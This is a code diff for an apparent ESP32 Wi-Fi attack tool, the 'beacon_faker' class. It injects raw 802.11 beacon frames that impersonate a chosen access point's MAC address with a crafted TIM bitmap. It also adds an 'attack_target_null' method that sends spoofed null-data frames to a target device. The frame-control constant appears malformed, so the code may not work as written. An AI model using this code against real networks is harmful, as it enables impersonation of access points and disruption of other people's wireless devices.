@@ -25,14 +25,14 @@ uint8_t beacon_raw_template[] = {
 
 uint8_t beacon_buffer[MAX_BEACON_LEN];
 
-void beacon_faker::send_basic_beacon(HardwareSerial &_Serial){
+void beacon_faker::send_basic_beacon(){
     ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_raw_template, sizeof(beacon_raw_template), false));
 }
 
 /*
     This function will use the template to make
 */
-void send_imitate_beacon(uint8_t source_addr[6], uint8_t *TIM_bit_map, int map_len, HardwareSerial &_Serial){
+void beacon_faker::send_imitate_beacon(uint8_t source_addr[6], uint8_t *TIM_bit_map, int map_len){
 
     memcpy(beacon_buffer, beacon_raw_template, sizeof(beacon_raw_template));
     
@@ -51,6 +51,18 @@ void send_imitate_beacon(uint8_t source_addr[6], uint8_t *TIM_bit_map, int map_l
     }
 
     memcpy(beacon_buffer+TIM_OFFSET, &m_TIM, 5 + map_len);
-    
     ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, TIM_OFFSET + 5 + map_len, false));
+}
+
+
+#define FRAME_CTRL_NULL_DATA 0x01001000
+void beacon_faker::attack_target_null(uint8_t mmac[6]){
+    struct mac_header_template header;
+    header.Frame_Ctrl[0] = FRAME_CTRL_NULL_DATA >> 4;
+    header.Frame_Ctrl[1] = FRAME_CTRL_NULL_DATA;
+    memcpy(header.dest_addr, mmac, 6);
+    memcpy(header.scr_addr, _src_address, 6);
+    memcpy(header.BSSID, _src_address, 6);
+    // 空数据包只有null
+    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, &header, sizeof(header), false));
 }
